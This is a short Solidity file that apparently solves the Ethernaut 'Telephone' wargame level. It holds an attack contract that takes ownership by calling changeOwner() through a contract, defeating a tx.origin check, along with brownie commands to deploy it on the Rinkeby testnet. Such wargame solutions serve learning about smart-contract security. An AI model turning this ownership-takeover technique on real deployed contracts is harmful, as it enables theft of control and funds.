/*

Note : calling the changeOwner() function from a contract will pass the tx.origin !=  msg.sender check

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# deploy the attack contract 

TelephoneAttack.deploy('TelephoneContractAddress',{'from': a[0]})

# confirm owner

web3.eth.getStorageAt("TelehphoneContractAddress",0)

# submit instance

# (OPTIONAL) call destroy() to cleanup

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

contract TelephoneAttack {

constructor(address _Telephone) {

    Telephone telphoneContract = Telephone(_Telephone);

    telphoneContract.changeOwner(msg.sender);

    }

function destroy() public {

    selfdestruct(payable(msg.sender));

    }

}

